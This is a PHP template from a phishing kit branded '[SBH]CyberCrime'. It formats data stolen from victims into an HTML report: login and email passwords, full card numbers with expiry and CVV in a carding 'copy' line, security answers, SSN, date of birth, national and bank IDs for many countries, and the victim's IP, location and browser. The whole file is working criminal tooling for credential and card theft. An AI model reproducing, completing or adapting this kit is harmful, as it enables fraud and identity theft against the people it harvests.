<?php @error_reporting(0);
$data = "
    
     <html>
		    <body><p>
      ++-------------☣[SBH]CyberCrime☣-------------++<br>
      ++-------------☣-Modal - Nikah-☣-------------++<br>
<br><br>
<br>
<br>
Email           :  " . $userid . "<br>
Password		:  " . $password . "<br>
Email Password	:  " . $epass . "<br>
<p style='margin: 0;font-size: 12px;line-height: 24px'>++====================== [ Credit ] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
Cardholders     :  " . $ccname . "<br>
CC Number		:  " . $ccno . "<br>
Expired		    :  " . $expiry . "<br>
CVV 			:  " . $secode . "<br>
Copy            :  " . $ccno . "|" . $copyexpiry . "|" . $secode . "<br>
BIN/IIN Info	:  " . $ccbrand . " - " . $cctype . " - " . $ccklas . " - " . $ccbank . "<br>
Sec Question 1	:  " . $q1 . "<br>
Sec Answer		:  " . $a1 . "<br>
Sec Question 2	:  " . $q2 . "<br>
Sec Answer		:  " . $a2 . "<br>
Sec Question 3	:  " . $q3 . "<br>
Sec Answer		:  " . $a3 . "<br></p>
<p style='margin: 0;font-size: 12px;line-height: 24px'>++====================== [ Billing ] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
Full Name   	:  " . $name . "<br>
Address			:  " . $address . "<br>
City/Town		:  " . $city . "<br>
State			:  " . $state . "<br>
Zip/PostCode	:  " . $postcode . "<br>
Country			:  " . $nama_negara . "<br>
Phone Number	:  " . $telephone . "<br>
SSN				:  " . $ssn . "<br>
DOB				:  " . $dob . "<br>++===================== [ Other ] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
Account Number (UK/IE/IN/TH)	    : " . $acno . "<br>
Citizen ID (TH)					    : " . $citizenid . "<br>
Credit Limit (IE/TH/IN/AU/NZ/SA)	: " . $climit . "<br>
Bank Access Number (NZ)			    : " . $bans . "<br>
NAB ID (AU)			    	        : " . $nabid . "<br>
Bank Account (AU)			    	: " . $bankaccount . "<br>
Sortcode (UK/IE)			      	: " . $sort . "<br>
Passport (CY)					    : " . $passport . "<br>
Qatar ID (QA)					    : " . $qatarid . "<br>
National ID (SA)			    	: " . $naid . "<br>
Civil ID Number (KW)			    : " . $civilid . "<br>
ID Number (GR/HK)		    		: " . $numbid . "<br>
Card ID (JP)                        :  ". $cardid."<br>
Card Password (JP)                  :  ". $cardpassword."<br>+=================== [ Device Info ] ==================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
IP Addrs      :  ".$_SERVER['REMOTE_ADDR']."<br>
Location      :   ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country']."<br>
Platform        :	".$systemInfo['os']."<br>
Browser         :	".$systemInfo['browser']."<br>
User Agent      :	".$systemInfo['useragent']."</p>

<br><br>
<br>
<br>
      ++-------------☣[SBH]CyberCrime☣-------------++<br>
      ++-------------☣-Modal - Nikah-☣-------------++<br></p>

		    </body>
	    </html>

    
    ";
?>